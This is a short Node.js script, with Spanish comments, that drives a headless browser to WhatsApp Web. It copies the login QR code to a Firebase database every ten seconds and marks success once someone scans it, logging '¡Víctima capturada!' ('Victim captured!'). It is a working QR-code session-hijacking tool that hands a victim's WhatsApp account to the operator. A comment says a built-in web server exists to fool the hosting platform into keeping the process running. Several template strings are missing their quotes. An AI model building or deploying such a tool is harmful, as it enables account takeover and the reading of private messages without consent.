const puppeteer = require('puppeteer');
const admin = require('firebase-admin');
const http = require('http'); // Servidor para engañar a Render

// 1. CONFIGURA TU FIREBASE ADMIN
const serviceAccount = require("./serviceAccountKey.json"); 

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();
const adminUID = "TU_UID_AQUI"; // <--- PONE TU UID REAL AQUÍ

async function startWA() {
    console.log([*] Iniciando motor para UID: ${adminUID});
    
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--single-process'
        ]
    });
    
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
    
    // Ir a WhatsApp Web
    await page.goto('https://web.whatsapp.com', { waitUntil: 'networkidle2', timeout: 0 });

    setInterval(async () => {
        try {
            const qrCanvas = await page.$('canvas');
            if (qrCanvas) {
                const qrData = await page.evaluate(() => {
                    const canvas = document.querySelector('canvas');
                    return canvas ? canvas.toDataURL() : null;
                });

                if (qrData) {
                    await db.collection("whatsapp_sessions").doc(adminUID).set({
                        qrCode: qrData,
                        status: "esperando",
                        lastUpdate: admin.firestore.FieldValue.serverTimestamp()
                    }, { merge: true });
                    console.log("QR Sincronizado correctamente.");
                }
            }

            const loggedIn = await page.$('header span[data-icon="chat"]');
            if (loggedIn) {
                await db.collection("whatsapp_sessions").doc(adminUID).update({ status: "exito" });
                console.log("¡Víctima capturada!");
            }
        } catch (e) {
            console.log("Buscando QR...");
        }
    }, 10000); // Cada 10 segundos
}

// --- SERVIDOR PARA QUE RENDER NO SE APAGUE ---
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('MOTOR WA ACTIVO\n');
}).listen(port, () => {
    console.log(Servidor de salud en puerto ${port});
    startWA(); // Iniciamos el robot después de abrir el puerto
});
